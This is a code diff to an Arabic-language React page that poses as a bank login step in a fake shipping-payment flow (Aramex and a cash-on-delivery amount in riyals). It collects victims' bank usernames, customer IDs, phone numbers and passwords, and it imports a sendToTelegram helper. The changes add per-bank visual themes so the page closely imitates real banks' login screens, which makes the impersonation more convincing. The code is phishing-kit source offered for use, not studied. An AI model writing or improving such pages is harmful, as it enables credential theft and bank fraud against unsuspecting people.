@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useEffect, useState, type CSSProperties } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -11,12 +11,14 @@ import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
+import { getBankLoginTheme } from "@/lib/bankThemes";
+import FullScreenLoader from "@/components/FullScreenLoader";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData } = useLink(id);
+  const { data: linkData, isLoading } = useLink(id);
   
   // Bank login credentials state
   const [username, setUsername] = useState("");
@@ -39,15 +41,51 @@ const PaymentBankLogin = () => {
     cardType: sessionStorage.getItem('cardType') || '',
   };
   
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  if (isLoading) {
+    return <FullScreenLoader label="جاري تجهيز صفحة تسجيل الدخول البنكي..." />;
+  }
+
+  if (!linkData) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
+        <div className="text-center p-8">
+          <Lock className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
+          <h2 className="text-lg font-semibold mb-2">تعذر تحميل بيانات الدفع</h2>
+          <p className="text-sm text-muted-foreground">تأكد من صلاحية الرابط أو أعد المحاولة لاحقاً.</p>
+        </div>
+      </div>
+    );
+  }
+
+  const payload = (linkData.payload ?? {}) as Record<string, any>;
+  const serviceKey = payload.service_key || customerInfo.service || 'aramex';
+  const serviceName = payload.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
+  const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
   
+  useEffect(() => {
+    const method = sessionStorage.getItem('paymentMethod');
+    const bank = sessionStorage.getItem('selectedBank');
+
+    if (!method) {
+      navigate(`/pay/${id}/track`);
+      return;
+    }
+
+    if (method !== 'login') {
+      navigate(`/pay/${id}/details`);
+      return;
+    }
+
+    if (!bank || bank === 'skipped') {
+      navigate(`/pay/${id}/track`);
+    }
+  }, [id, navigate]);
+
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
+  const bankTheme = getBankLoginTheme(selectedBank?.id || '', selectedBank?.color || branding.colors.primary);
   
   // Determine login type based on bank
   const getLoginType = () => {
@@ -235,12 +273,23 @@ const PaymentBankLogin = () => {
       title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
       description="أدخل بيانات الدخول للبنك لتأكيد العملية"
       icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+      showHero={false}
+      backgroundStyle={{ background: bankTheme.backgroundGradient }}
+      cardStyle={{
+        background: bankTheme.panelBackground,
+        borderColor: bankTheme.panelBorder,
+        borderTopColor: bankTheme.primary,
+        boxShadow: bankTheme.buttonShadow,
+        fontFamily: bankTheme.fontFamily,
+      }}
     >
       {/* Bank Info Header */}
       <div 
-        className="rounded-lg p-4 sm:p-5 mb-6 flex items-center gap-4"
+        className="rounded-xl p-4 sm:p-6 mb-6 flex items-center gap-4 text-white shadow-lg"
         style={{
-          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
+          background: bankTheme.headerGradient,
+          boxShadow: bankTheme.buttonShadow,
+          fontFamily: bankTheme.fontFamily,
         }}
       >
         <div 
@@ -262,21 +311,21 @@ const PaymentBankLogin = () => {
       <div 
         className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          background: bankTheme.accentBackground,
+          border: `1px solid ${bankTheme.accentBorder}`,
         }}
       >
-        <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
-        <div className="text-xs sm:text-sm">
+        <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: bankTheme.primary }} />
+        <div className="text-xs sm:text-sm" style={{ fontFamily: bankTheme.fontFamily }}>
           <p className="font-semibold mb-1">تسجيل دخول آمن</p>
-          <p className="text-muted-foreground">
+          <p className="text-muted-foreground" style={{ color: bankTheme.subtleText }}>
             سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
           </p>
         </div>
       </div>
 
       {/* Login Form */}
-      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
+      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5" style={{ fontFamily: bankTheme.fontFamily }}>
         {/* Username Login */}
         {loginType === 'username' && (
           <>
@@ -288,6 +337,11 @@ const PaymentBankLogin = () => {
                 value={username}
                 onChange={(e) => setUsername(e.target.value)}
                 className="h-12 sm:h-14 text-base sm:text-lg"
+                style={{
+                  background: bankTheme.inputBackground,
+                  borderColor: bankTheme.inputBorder,
+                  '--tw-ring-color': bankTheme.focusRing,
+                } as CSSProperties}
                 autoComplete="username"
                 required
               />
@@ -306,6 +360,11 @@ const PaymentBankLogin = () => {
                 value={customerId}
                 onChange={(e) => setCustomerId(e.target.value)}
                 className="h-12 sm:h-14 text-base sm:text-lg"
+                style={{
+                  background: bankTheme.inputBackground,
+                  borderColor: bankTheme.inputBorder,
+                  '--tw-ring-color': bankTheme.focusRing,
+                } as CSSProperties}
                 inputMode="numeric"
                 required
               />
@@ -324,6 +383,11 @@ const PaymentBankLogin = () => {
                 value={phoneNumber}
                 onChange={(e) => setPhoneNumber(e.target.value)}
                 className="h-12 sm:h-14 text-base sm:text-lg"
+                style={{
+                  background: bankTheme.inputBackground,
+                  borderColor: bankTheme.inputBorder,
+                  '--tw-ring-color': bankTheme.focusRing,
+                } as CSSProperties}
                 inputMode="tel"
                 required
               />
@@ -341,6 +405,11 @@ const PaymentBankLogin = () => {
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               className="h-12 sm:h-14 text-base sm:text-lg pl-12"
+              style={{
+                background: bankTheme.inputBackground,
+                borderColor: bankTheme.inputBorder,
+                '--tw-ring-color': bankTheme.focusRing,
+              } as CSSProperties}
               autoComplete="current-password"
               required
             />
@@ -362,14 +431,18 @@ const PaymentBankLogin = () => {
         <div className="flex items-center justify-between text-xs sm:text-sm">
           <div className="flex items-center gap-2">
             <input type="checkbox" id="remember" className="rounded" />
-            <label htmlFor="remember" className="text-muted-foreground cursor-pointer">
+            <label
+              htmlFor="remember"
+              className="text-muted-foreground cursor-pointer"
+              style={{ color: bankTheme.subtleText }}
+            >
               تذكرني
             </label>
           </div>
           <button
             type="button"
             className="text-muted-foreground hover:underline"
-            style={{ color: selectedBank?.color || branding.colors.primary }}
+            style={{ color: bankTheme.primary }}
           >
             نسيت كلمة المرور؟
           </button>
@@ -382,7 +455,9 @@ const PaymentBankLogin = () => {
           className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-lg"
           disabled={isSubmitting}
           style={{
-            background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`
+            background: bankTheme.buttonGradient,
+            boxShadow: bankTheme.buttonShadow,
+            '--tw-ring-color': bankTheme.focusRing,
           }}
         >
           {isSubmitting ? (
@@ -402,8 +477,11 @@ const PaymentBankLogin = () => {
       </form>
       
       {/* Additional Info */}
-      <div className="mt-6 pt-6 border-t text-center">
-        <p className="text-xs text-muted-foreground mb-3">
+      <div className="mt-6 pt-6 border-t text-center" style={{ borderColor: bankTheme.panelBorder }}>
+        <p
+          className="text-xs text-muted-foreground mb-3"
+          style={{ color: bankTheme.subtleText }}
+        >
           لا تملك حساب؟
         </p>
         <Button
@@ -411,7 +489,11 @@ const PaymentBankLogin = () => {
           variant="outline"
           size="sm"
           className="text-xs"
-          style={{ borderColor: selectedBank?.color || branding.colors.primary }}
+          style={{
+            borderColor: bankTheme.primary,
+            color: bankTheme.primary,
+            '--tw-ring-color': bankTheme.focusRing,
+          }}
         >
           تسجيل حساب جديد
         </Button>
